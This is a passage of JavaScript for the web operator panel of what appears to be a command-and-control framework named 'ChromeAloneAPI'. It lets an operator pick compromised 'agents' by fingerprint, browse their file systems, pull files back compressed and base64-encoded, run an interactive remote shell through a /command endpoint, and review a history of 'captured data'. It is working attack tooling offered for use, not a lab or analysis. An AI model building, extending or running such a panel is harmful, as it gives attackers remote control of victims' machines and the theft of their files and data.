        const dataTypes = [...new Set(this.capturedDataHistory.map(item => item.dataType).filter(type => type))].sort();
        
        typeFilter.innerHTML = '<option value="">All Types</option>';
        dataTypes.forEach(type => {
            const option = document.createElement('option');
            option.value = type;
            option.textContent = type;
            typeFilter.appendChild(option);
        });
        
        // Restore previous selection if still available
        if (currentTypeValue && dataTypes.includes(currentTypeValue)) {
            typeFilter.value = currentTypeValue;
        }
    }

    updateUnreadCounter() {
        const unreadCount = this.capturedDataHistory.filter(item => !item.isRead).length;
        const counterElement = document.getElementById('unreadCounter');
        
        console.log('Updating unread counter:', unreadCount, 'unread items');
        
        if (unreadCount > 0) {
            counterElement.textContent = unreadCount > 9 ? '9+' : unreadCount.toString();
            counterElement.classList.remove('hidden');
        } else {
            counterElement.textContent = '0';
            counterElement.classList.add('hidden');
        }
    }

    markAsRead(itemId) {
        const item = this.capturedDataHistory.find(item => item.id === itemId);
        if (item && !item.isRead) {
            item.isRead = true;
            this.saveCapturedDataHistory();
            this.displayCapturedData();
            this.updateUnreadCounter();
        }
    }

    markAllAsRead() {
        console.log('Mark all as read called. Current captured data:', this.capturedDataHistory.length, 'items');
        let hasChanges = false;
        let unreadCount = 0;
        
        this.capturedDataHistory.forEach(item => {
            if (!item.isRead) {
                console.log('Marking item as read:', item.id);
                item.isRead = true;
                hasChanges = true;
                unreadCount++;
            }
        });
        
        console.log('Found', unreadCount, 'unread items to mark as read');
        
        if (hasChanges) {
            this.saveCapturedDataHistory();
            this.displayCapturedData();
            this.updateUnreadCounter();
            this.showMessage('All captured data marked as read');
        } else {
            this.showMessage('No unread items to mark as read');
        }
    }

    updateBrowserAgentSelector(agents) {
        const selector = document.getElementById('browserAgentSelect');
        const currentValue = selector.value;
        
        selector.innerHTML = '<option value="">Select an agent...</option>';
        
        if (agents && agents.length > 0) {
            agents.forEach(agent => {
                if (agent.active) { // Only show active agents for file browsing
                    const option = document.createElement('option');
                    option.value = agent.fingerprint;
                    const displayName = this.getAgentDisplayName(agent.fingerprint);
                    option.textContent = `${displayName} (Online)`;
                    selector.appendChild(option);
                }
            });
        }
        
        // Restore previous selection if still available
        if (currentValue) {
            selector.value = currentValue;
        }
    }

    startFileBrowser() {
        const fingerprint = document.getElementById('browserAgentSelect').value;
        const startPath = document.getElementById('browserStartPath').value.trim();
        
        if (!fingerprint) {
            this.showMessage('Please select an agent first', true);
            return;
        }
        
        if (!startPath) {
            this.showMessage('Please enter a starting path', true);
            return;
        }
        
        this.currentBrowserAgent = fingerprint;
        this.currentBrowserPath = startPath;
        this.browserHistory = [startPath];
        
        this.browseTo(startPath);
    }

    refreshCurrentDirectory() {
        if (!this.currentBrowserPath || !this.currentBrowserAgent) {
            this.showMessage('No directory to refresh. Start browsing first.', true);
            return;
        }
        
        this.browseTo(this.currentBrowserPath);
    }

    browseTo(path) {
        if (!this.currentBrowserAgent) {
            this.showMessage('No agent selected', true);
            return;
        }
        
        // Show loading state
        const browserContent = document.getElementById('browserContent');
        browserContent.innerHTML = '<div class="browser-loading">Loading directory contents...</div>';
        
        // Update breadcrumb
        this.updateBreadcrumb(path);
        
        // Execute ls command
        this.executeLsCommand(this.currentBrowserAgent, path);
    }

    async executeLsCommand(fingerprint, path) {
        try {
            const data = await this.makeRequest('/command', {
                method: 'POST',
                body: JSON.stringify({
                    command: 'ls',
                    payload: path,
                    fingerprint: fingerprint
                })
            });
            
            console.log('File browser ls command executed, taskId:', data.taskId);
            
            // Store the task ID and path for when we get the response
            this.pendingBrowserTask = {
                taskId: data.taskId,
                path: path
            };
            
        } catch (error) {
            console.error('File browser ls command failed:', error);
            this.showBrowserError(`Failed to browse directory: ${error.message}`);
        }
    }

    updateBreadcrumb(path) {
        const breadcrumb = document.getElementById('browserBreadcrumb');
        const pathDisplay = document.getElementById('browserPathDisplay');
        const upButton = document.getElementById('browserUpButton');
        
        pathDisplay.textContent = `📁 ${path}`;
        breadcrumb.classList.remove('hidden');
        
        // Show/hide up button based on whether we can go up
        if (this.canNavigateUp(path)) {
            upButton.classList.remove('hidden');
        } else {
            upButton.classList.add('hidden');
        }
    }

    showBrowserError(message) {
        const browserContent = document.getElementById('browserContent');
        browserContent.innerHTML = `<div class="browser-error">${message}</div>`;
    }

    canNavigateUp(path) {
        if (!path || typeof path !== 'string') return false;
        
        const trimmedPath = path.trim();
        
        // Can't go up from root drives (c:\, d:\, /, etc.)
        if (trimmedPath.match(/^[a-zA-Z]:\\?$/)) return false; // Windows drive root
        if (trimmedPath === '/') return false; // Unix root
        if (trimmedPath === '') return false; // Empty path
        
        return true;
    }

    navigateUp() {
        if (!this.currentBrowserPath || !this.currentBrowserAgent) {
            this.showMessage('No current directory to navigate up from', true);
            return;
        }
        
        const parentPath = this.getParentPath(this.currentBrowserPath);
        if (!parentPath) {
            this.showMessage('Already at root directory', true);
            return;
        }
        
        console.log('Navigating up from:', this.currentBrowserPath, 'to:', parentPath);
        
        // Add to browser history
        this.browserHistory.push(parentPath);
        
        // Navigate to parent path
        this.browseTo(parentPath);
    }

    getParentPath(path) {
        if (!this.canNavigateUp(path)) return null;
        
        const trimmedPath = path.trim();
        
        // Handle Windows paths
        if (trimmedPath.includes('\\')) {
            const parts = trimmedPath.split('\\').filter(part => part !== '');
            if (parts.length <= 1) return null; // Already at root
            
            // Remove the last part and rejoin
            parts.pop();
            return parts.join('\\') + '\\';
        }
        
        // Handle Unix paths
        if (trimmedPath.includes('/')) {
            const parts = trimmedPath.split('/').filter(part => part !== '');
            if (parts.length <= 0) return null; // Already at root
            
            // Remove the last part and rejoin
            parts.pop();
            return '/' + parts.join('/') + (parts.length > 0 ? '/' : '');
        }
        
        return null;
    }

    handleLsResponse(taskId, result) {
        // Check if this is a response to our pending browser task
        if (this.pendingBrowserTask && this.pendingBrowserTask.taskId === taskId) {
            console.log('Received ls response for file browser:', result);
            this.displayBrowserContents(result, this.pendingBrowserTask.path);
            this.pendingBrowserTask = null;
        }
    }

    displayBrowserContents(result, path) {
        const browserContent = document.getElementById('browserContent');
        
        if (!result || typeof result !== 'string') {
            this.showBrowserError('Invalid directory listing received');
            return;
        }
        
        // Check if this is file content rather than directory listing (before splitting lines)
        if (result.startsWith('FILE_CONTENT_COMPRESSED:')) {
            const compressedContent = result.substring('FILE_CONTENT_COMPRESSED:'.length);
            this.handleCompressedFileContent(compressedContent, path);
            return;
        } else if (result.startsWith('FILE_CONTENT:')) {
            const encodedContent = result.substring('FILE_CONTENT:'.length);
            // Decode base64 to get the original file content
            try {
                const fileContent = atob(encodedContent);
                this.displayFileContent(fileContent, path);
            } catch (error) {
                console.error('Error decoding base64 file content:', error);
                this.showBrowserError(`Error decoding file content: ${error.message}`);
            }
            return;
        }
        
        // Parse the ls result (now with pipe-separated format: "📁 folder/|size|date" or "📄 file|size|date")
        const lines = result.split('\n').filter(line => line.trim());
        
        if (lines.length === 0 || lines[0].includes('EMPTY_DIRECTORY')) {
            browserContent.innerHTML = '<div class="browser-placeholder">Directory is empty</div>';
            return;
        }
        
        let itemsHtml = '';
        
        lines.forEach(line => {
            const trimmedLine = line.trim();
            
            if (trimmedLine.startsWith('📁 ')) {
                // Parse folder with pipe-separated metadata: "📁 foldername/|size|date"
                const parts = trimmedLine.split('|');
                let folderName = parts[0].substring(2).replace(/\/$/, '').trim(); // Remove emoji and trailing slash
                const size = parts[1] || '';
                const date = parts[2] || '';
                
                console.log('Parsed folder:', { folderName, size, date });
                itemsHtml += `
                    <div class="browser-item folder" onclick="window.chromeAloneAPI.navigateToFolder('${this.escapeHtml(folderName)}')">
                        <div class="browser-icon">📁</div>
                        <div class="browser-name">${this.escapeHtml(folderName)}</div>
                        <div class="browser-size">${this.escapeHtml(size)}</div>
                        <div class="browser-date">${this.escapeHtml(date)}</div>
                    </div>
                `;
            } else if (trimmedLine.startsWith('📄 ')) {
                // Parse file with pipe-separated metadata: "📄 filename|size|date"
                const parts = trimmedLine.split('|');
                const fileName = parts[0].substring(2).trim(); // Remove emoji
                const size = parts[1] || '';
                const date = parts[2] || '';
                
                console.log('Parsed file:', { fileName, size, date });
                itemsHtml += `
                    <div class="browser-item file" onclick="window.chromeAloneAPI.viewFile('${this.escapeHtml(fileName)}')">
                        <div class="browser-icon">📄</div>
                        <div class="browser-name">${this.escapeHtml(fileName)}</div>
                        <div class="browser-size">${this.escapeHtml(size)}</div>
                        <div class="browser-date">${this.escapeHtml(date)}</div>
                    </div>
                `;
            }
        });
        
        if (itemsHtml === '') {
            browserContent.innerHTML = '<div class="browser-placeholder">No readable items in directory</div>';
        } else {
            // Add header row
            const headerHtml = `
                <div class="browser-header">
                    <div class="browser-icon"></div>
                    <div class="browser-name"><strong>Name</strong></div>
                    <div class="browser-size"><strong>Size</strong></div>
                    <div class="browser-date"><strong>Date Modified</strong></div>
                </div>
            `;
            browserContent.innerHTML = headerHtml + itemsHtml;
        }
        
        // Update current path
        this.currentBrowserPath = path;
    }

    navigateToFolder(folderName) {
        if (!this.currentBrowserPath || !this.currentBrowserAgent) {
            return;
        }
        
        // Build new path
        let newPath = this.currentBrowserPath.trim();
        
        // Ensure path ends with separator (use backslash for Windows paths)
        if (!newPath.endsWith('\\') && !newPath.endsWith('/')) {
            newPath += '\\';
        }
        
        // Append folder name (make sure to trim any whitespace)
        newPath += folderName.trim();
        
        console.log('Navigating from:', this.currentBrowserPath, 'to:', newPath);
        
        // Add to browser history
        this.browserHistory.push(newPath);
        
        // Navigate to new path
        this.browseTo(newPath);
    }

    async handleCompressedFileContent(compressedContent, filePath) {
        try {
            // Decode base64 using more robust method
            const compressedBytes = atob(compressedContent);
            
            // Convert to Uint8Array using Uint8Array.from for better handling
            const uint8Array = Uint8Array.from(compressedBytes, c => c.charCodeAt(0));
            
            // Decompress using DecompressionStream (modern browsers)
            if ('DecompressionStream' in window) {
                const stream = new DecompressionStream('gzip');
                const writer = stream.writable.getWriter();
                const reader = stream.readable.getReader();
                
                // Write the compressed data
                writer.write(uint8Array);
                writer.close();
                
                // Read the decompressed data
                const chunks = [];
                let done = false;
                while (!done) {
                    const { value, done: readerDone } = await reader.read();
                    done = readerDone;
                    if (value) {
                        chunks.push(value);
                    }
                }
                
                // Combine chunks and convert to string
                const totalLength = chunks.reduce((sum, chunk) => sum + chunk.length, 0);
                const combined = new Uint8Array(totalLength);
                let offset = 0;
                for (const chunk of chunks) {
                    combined.set(chunk, offset);
                    offset += chunk.length;
                }
                
                // Check if it's binary or text data
                try {
                    new TextDecoder('utf-8', { fatal: true }).decode(combined);
                    // If we get here, it's valid UTF-8 text
                    const decompressed = new TextDecoder().decode(combined);
                    this.displayFileContent(decompressed, filePath, true);
                } catch (e) {
                    // Binary data - offer download
                    this.displayFileContent(combined, filePath, false, true);
                }
                
            } else {
                // Fallback: use pako library if available, otherwise show error
                if (typeof pako !== 'undefined') {
                    const decompressed = pako.inflate(uint8Array, { to: 'string' });
                    this.displayFileContent(decompressed, filePath, true);
                } else {
                    this.showBrowserError('Cannot decompress large file: Browser does not support decompression. File was compressed to improve transfer.');
                }
            }
            
        } catch (error) {
            console.error('Error decompressing file content:', error);
            this.showBrowserError(`Error decompressing file: ${error.message}`);
        }
    }

    displayFileContent(fileContent, filePath, wasCompressed = false) {
        const browserContent = document.getElementById('browserContent');
        
        // Extract filename from path
        const pathParts = filePath.split(/[\\\/]/);
        const fileName = pathParts[pathParts.length - 1] || 'file';
        
        // Determine if this is binary data - check for Uint8Array or non-printable characters
        const isBinary = (fileContent instanceof Uint8Array) || this.isBinaryData(fileContent);
        
        // Calculate file size regardless of type
        const fileSize = fileContent.length || fileContent.byteLength || 0;
        
        // Create appropriate blob type
        let blob, displayContent;
        if (isBinary) {
            // For binary data, create a blob with appropriate MIME type
            const mimeType = this.getMimeType(fileName);
            blob = new Blob([fileContent], { type: mimeType });
            displayContent = `<div class="binary-file-notice">📁 Binary file (${fileSize} bytes)<br>Use download button to save file.</div>`;
        } else {
            // For text data, display as text
            blob = new Blob([fileContent], { type: 'text/plain' });
            displayContent = `<pre class="file-content-text">${this.escapeHtml(fileContent)}</pre>`;
        }
        
        const downloadUrl = URL.createObjectURL(blob);
        const compressionNote = wasCompressed ? '<div class="compression-note">📦 File was compressed for transfer</div>' : '';
        
        browserContent.innerHTML = `
            <div class="file-viewer">
                <div class="file-header">
                    <div class="file-info">
                        <div class="file-icon">${isBinary ? '📦' : '📄'}</div>
                        <div class="file-details">
                            <div class="file-name">${this.escapeHtml(fileName)}</div>
                            <div class="file-size">${fileSize} bytes ${isBinary ? '(binary)' : '(text)'}</div>
                            ${compressionNote}
                        </div>
                    </div>
                    <div class="file-actions">
                        <button onclick="window.chromeAloneAPI.downloadFile('${downloadUrl}', '${this.escapeHtml(fileName)}')" class="download-btn">
                            💾 Download File
                        </button>
                    </div>
                </div>
                <div class="file-content">
                    ${displayContent}
                </div>
            </div>
        `;
    }

    isBinaryData(data) {
        // Check for null bytes or high percentage of non-printable characters
        if (typeof data === 'string') {
            const nullBytes = (data.match(/\0/g) || []).length;
            if (nullBytes > 0) return true;
            
            // Count non-printable characters (excluding common whitespace)
            let nonPrintable = 0;
            for (let i = 0; i < Math.min(data.length, 1000); i++) {
                const code = data.charCodeAt(i);
                if (code < 32 && code !== 9 && code !== 10 && code !== 13) {
                    nonPrintable++;
                }
                if (code > 126) {
                    nonPrintable++;
                }
            }
            
            // If more than 10% non-printable, consider it binary
            return (nonPrintable / Math.min(data.length, 1000)) > 0.1;
        }
        return false;
    }

    getMimeType(fileName) {
        const ext = fileName.split('.').pop().toLowerCase();
        const mimeTypes = {
            'exe': 'application/octet-stream',
            'dll': 'application/octet-stream',
            'bin': 'application/octet-stream',
            'pdf': 'application/pdf',
            'jpg': 'image/jpeg',
            'jpeg': 'image/jpeg',
            'png': 'image/png',
            'gif': 'image/gif',
            'zip': 'application/zip',
            'tar': 'application/x-tar',
            'gz': 'application/gzip'
        };
        return mimeTypes[ext] || 'application/octet-stream';
    }

    viewFile(fileName) {
        if (!this.currentBrowserPath || !this.currentBrowserAgent) {
            return;
        }
        
        // Build file path
        let filePath = this.currentBrowserPath.trim();
        
        // Ensure path ends with separator
        if (!filePath.endsWith('\\') && !filePath.endsWith('/')) {
            filePath += '\\';
        }
        
        // Append file name
        filePath += fileName.trim();
        
        console.log('Viewing file:', filePath);
        
        // Navigate to the file path (this will trigger file content loading)
        this.browseTo(filePath);
    }

    downloadFile(url, filename) {
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        
        // Clean up the blob URL after a short delay
        setTimeout(() => {
            URL.revokeObjectURL(url);
        }, 1000);
        
        this.showMessage(`File "${filename}" downloaded successfully`);
    }

    switchTab(tabName) {
        // Remove active class from all tabs and content
        document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
        
        // Add active class to selected tab and content
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
        document.getElementById(`${tabName}-tab`).classList.add('active');
        
        // Update the appropriate display
        if (tabName === 'tasks') {
            this.displayTaskHistory();
        } else if (tabName === 'captured') {
            this.displayCapturedData();
            this.updateCapturedDataFilters();
        } else if (tabName === 'browser') {
            // File browser doesn't need special initialization
        } else if (tabName === 'shell') {
            // Focus the shell input when shell tab is activated
            setTimeout(() => {
                const shellInput = document.getElementById('shellInput');
                if (shellInput && !shellInput.disabled) {
                    shellInput.focus();
                }
            }, 100);
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // Interactive Shell Methods
    onShellAgentChange(e) {
        const selectedAgent = e.target.value;
        this.shellCurrentAgent = selectedAgent;
        const shellInput = document.getElementById('shellInput');
        const shellPrompt = document.getElementById('shellPrompt');
        
        if (selectedAgent) {
            shellInput.disabled = false;
            shellInput.placeholder = 'Enter shell command...';
            const displayName = this.getAgentDisplayName(selectedAgent);
            shellPrompt.textContent = `${displayName}$`;
            
            // Add welcome message
            this.addShellOutput(`Connected to agent: ${displayName}`, 'shell-welcome');
            shellInput.focus();
        } else {
            shellInput.disabled = true;
            shellInput.placeholder = 'Select an agent first...';
            shellPrompt.textContent = '$';
            this.shellCurrentAgent = '';
        }
    }

    handleShellInput(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            this.executeShellCommand();
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            this.navigateShellHistory('up');
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            this.navigateShellHistory('down');
        }
    }

    navigateShellHistory(direction) {
        if (this.shellHistory.length === 0) return;
        
        const shellInput = document.getElementById('shellInput');
        
        if (direction === 'up') {
            if (this.shellHistoryIndex === -1) {
                this.shellHistoryIndex = this.shellHistory.length - 1;
            } else if (this.shellHistoryIndex > 0) {
                this.shellHistoryIndex--;
            }
        } else if (direction === 'down') {
            if (this.shellHistoryIndex === -1) {
                return; // Already at the bottom
            } else if (this.shellHistoryIndex < this.shellHistory.length - 1) {
                this.shellHistoryIndex++;
            } else {
                this.shellHistoryIndex = -1;
                shellInput.value = '';
                return;
            }
        }
        
        if (this.shellHistoryIndex >= 0 && this.shellHistoryIndex < this.shellHistory.length) {
            shellInput.value = this.shellHistory[this.shellHistoryIndex];
        }
    }

    async executeShellCommand() {
        const shellInput = document.getElementById('shellInput');
        const command = shellInput.value.trim();
        
        if (!command || !this.shellCurrentAgent) {
            return;
        }
        
        // Add command to history
        if (this.shellHistory[this.shellHistory.length - 1] !== command) {
            this.shellHistory.push(command);
            // Limit history to 100 commands
            if (this.shellHistory.length > 100) {
                this.shellHistory.shift();
            }
        }
        this.shellHistoryIndex = -1;
        
        // Display command in terminal
        const displayName = this.getAgentDisplayName(this.shellCurrentAgent);
        this.addShellOutput(`${displayName}$ ${command}`, 'shell-command');
        
        // Clear input and show spinner
        shellInput.value = '';
        const spinnerId = this.addShellSpinner();
        
        try {
            // Parse command and arguments
            const [shellCmd, ...args] = command.split(' ');
            const shellArgs = args.join(' ');
            
            // Execute shell command
            const payload = `${shellCmd}|${shellArgs}`;
            const data = await this.makeRequest('/command', {
                method: 'POST',
                body: JSON.stringify({
                    fingerprint: this.shellCurrentAgent,
                    command: 'shell',
                    payload: payload
                })
            });
            
            this.removeShellSpinner(spinnerId);
            
            if (data.taskId) {
                // Don't add shell commands to task history - they're handled in real-time in the terminal
                this.addShellOutput(`Command queued (Task ID: ${data.taskId})`, 'shell-info');
                this.addShellOutput('Waiting for response...', 'shell-info');
            }
            
        } catch (error) {
            this.removeShellSpinner(spinnerId);
            this.addShellOutput(`Error: ${error.message}`, 'shell-error');
        }
    }

    executeShellQuickCommand(e) {
        const button = e.target;
        const shellCmd = button.dataset.shellcmd;
        const shellArgs = button.dataset.shellargs || '';
        
        // Switch to shell tab first
        this.switchTab('shell');
        
        // Check if we have an agent selected, if not, show message
        if (!this.shellCurrentAgent) {
            this.showMessage('Please select an agent in the Interactive Shell tab first', true);
            return;
        }
        
        // Set the command in the input field
        const shellInput = document.getElementById('shellInput');
        const fullCommand = shellArgs ? `${shellCmd} ${shellArgs}` : shellCmd;
        shellInput.value = fullCommand;
        
        // Execute the command
        this.executeShellCommand();
    }

    addShellOutput(text, className = 'shell-result') {
        const shellOutput = document.getElementById('shellOutput');
        const line = document.createElement('div');
        line.className = `shell-line ${className}`;
        line.textContent = text;
        shellOutput.appendChild(line);
        
        // Auto-scroll to bottom
        const terminal = document.getElementById('shellTerminal');
        terminal.scrollTop = terminal.scrollHeight;
    }

    addShellSpinner() {
        const shellOutput = document.getElementById('shellOutput');
        const spinnerId = 'spinner-' + Date.now();
        const spinner = document.createElement('div');
        spinner.id = spinnerId;
        spinner.className = 'shell-line shell-spinner';
        spinner.innerHTML = 'Executing... <span class="shell-spinner"></span>';
        shellOutput.appendChild(spinner);
        
        // Auto-scroll to bottom
        const terminal = document.getElementById('shellTerminal');
        terminal.scrollTop = terminal.scrollHeight;
        
        return spinnerId;
    }

    removeShellSpinner(spinnerId) {
        const spinner = document.getElementById(spinnerId);
        if (spinner) {
            spinner.remove();
        }
    }

    clearShellTerminal() {
        const shellOutput = document.getElementById('shellOutput');
        shellOutput.innerHTML = '<div class="shell-welcome">Terminal cleared</div>';
        
        // Focus input
        const shellInput = document.getElementById('shellInput');
        if (!shellInput.disabled) {
            shellInput.focus();
        }
    }

    updateShellAgentSelector(agents) {
        const selector = document.getElementById('shellAgentSelect');
        const currentValue = selector.value;
        
        selector.innerHTML = '<option value="">Select an agent...</option>';
        
        if (agents && agents.length > 0) {
            agents.forEach(agent => {
                if (agent.active) { // Only show active agents
                    const option = document.createElement('option');
                    option.value = agent.fingerprint;
                    const displayName = this.getAgentDisplayName(agent.fingerprint);
                    option.textContent = displayName;
                    selector.appendChild(option);
                }
            });
        }
        
        // Restore previous selection if still valid
        if (currentValue && document.querySelector(`#shellAgentSelect option[value="${currentValue}"]`)) {
            selector.value = currentValue;
        } else if (currentValue && this.shellCurrentAgent === currentValue) {
            // Agent is no longer available, disable shell
            this.onShellAgentChange({target: {value: ''}});
        }
    }

    processLsResult(result) {
        // Handle compressed file content in ls command results
        if (result.startsWith('FILE_CONTENT_COMPRESSED:')) {
            const compressedContent = result.substring('FILE_CONTENT_COMPRESSED:'.length);
            try {
                return this.decompressContent(compressedContent);
            } catch (error) {
                console.error('Error decompressing ls result:', error);
                return `[Decompression failed] ${result}`;
            }
        } else if (result.startsWith('FILE_CONTENT:')) {
            const encodedContent = result.substring('FILE_CONTENT:'.length);
            try {
                return atob(encodedContent);
            } catch (error) {
                console.error('Error decoding base64 ls result:', error);
                return `[Base64 decode failed] ${result}`;
            }
        }
        
        // Regular directory listing or other content
        return result;
    }

    decompressContent(compressedContent) {
        console.log('DECOMPRESSION DEBUG: decompressContent called with', compressedContent.length, 'chars');
        console.log('DECOMPRESSION DEBUG: First 100 chars:', compressedContent.substring(0, 100));
        
        // Use modern Uint8Array.from with base64 decoding to avoid corruption
        let uint8Array;
        
        try {
            // Method 1: Try using the modern fetch API approach for base64 decoding
            const dataUrl = 'data:application/octet-stream;base64,' + compressedContent;
            const response = fetch(dataUrl);
            const arrayBuffer = response.then(r => r.arrayBuffer());
            // This is async, so let's use the synchronous approach below instead
        } catch (e) {
            console.log('Modern base64 decode failed, falling back');
        }
        
        // Method 2: Use Uint8Array.from with more robust base64 decoding
        try {
            const binaryString = atob(compressedContent);
            uint8Array = Uint8Array.from(binaryString, c => c.charCodeAt(0));
        } catch (e) {
            console.error('Base64 decode failed:', e);
            // Method 3: Manual byte-by-byte with validation
            const binaryString = atob(compressedContent);
            uint8Array = new Uint8Array(binaryString.length);
            
            for (let i = 0; i < binaryString.length; i++) {
                const charCode = binaryString.charCodeAt(i);
                if (charCode > 255) {
                    console.warn(`Invalid byte value ${charCode} at position ${i}`);
                    uint8Array[i] = charCode & 0xFF;
                } else {
                    uint8Array[i] = charCode;
                }
            }
        }
        
        // Try different decompression methods
        if (typeof pako !== 'undefined') {
            // Use pako library if available (preferred for task display)
            try {
                // Decompress to raw bytes first (don't force string conversion)
                const decompressed = pako.inflate(uint8Array);
                
                // DEBUG: Show hex dump of first 100 bytes after decompression
                const hexDump = Array.from(decompressed.slice(0, 100))
                    .map(byte => byte.toString(16).padStart(2, '0'))
                    .join(' ');
                console.log('DECOMPRESSION DEBUG: First 100 bytes hex:', hexDump);
                console.log('DECOMPRESSION DEBUG: Decompressed', decompressed.length, 'bytes total');
                
                // Try to decode as UTF-8 text, but handle binary data gracefully
                try {
                    const text = new TextDecoder('utf-8', { fatal: true }).decode(decompressed);
                    return text;
                } catch (utf8Error) {
                    // Not valid UTF-8, treat as binary data
                    console.log('Decompressed data is binary, not text');
                    return `📁 Binary file (${decompressed.length} bytes)`;
                }
            } catch (error) {
                console.error('Pako decompression failed:', error);
                throw error;
            }
        } else {
            // Fallback: show a message that decompression isn't available
            const sizeInfo = `[Compressed content: ${compressedContent.length} chars, ~${uint8Array.length} bytes compressed]`;
            return `${sizeInfo}\n\nTo view this content, the file browser tab has decompression support.\nOr include the pako library for task result decompression.`;
        }
    }

    handleShellResponse(taskId, result) {
        console.log('Shell response received:', { taskId, result, type: typeof result });
        
        // Handle different result formats
        let decodedResult = result;
        
        // If result is null, undefined, or empty
        if (result === null || result === undefined || result === '') {
            decodedResult = '[No output returned]';
        } else if (typeof result === 'string') {
            // Try to decode base64 if it looks like base64
            try {
                // Check if it looks like base64 (basic check)
                if (result.match(/^[A-Za-z0-9+/]+=*$/)) {
                    decodedResult = atob(result);
                } else {
                    // If not base64, use as-is
                    decodedResult = result;
                }
            } catch (e) {
                console.warn('Failed to decode base64 result for shell command:', e);
                // If decode fails, show the raw result
                decodedResult = result;
            }
        } else if (typeof result === 'object') {
            // If result is an object, stringify it
            decodedResult = JSON.stringify(result, null, 2);
        } else {
            // For any other type, convert to string
            decodedResult = String(result);
        }
        
        // Display result in terminal
        this.addShellOutput(decodedResult, 'shell-result');
        
        // Add completion message
        this.addShellOutput(`[Command completed - Task ID: ${taskId}]`, 'shell-info');
    }
}

// Initialize the application
document.addEventListener('DOMContentLoaded', () => {
    window.chromeAloneAPI = new ChromeAloneAPI();
});

// Add some helpful keyboard shortcuts
document.addEventListener('keydown', (e) => {
    if (e.ctrlKey || e.metaKey) {
        switch (e.key) {
            case 'r':
                e.preventDefault();
                document.getElementById('getAgents').click();
                break;
            case 'Enter':
                if (e.target.id === 'command' || e.target.id === 'payload') {
                    e.preventDefault();
                    document.getElementById('executeCommand').click();
                }
                break;
        }
    }
});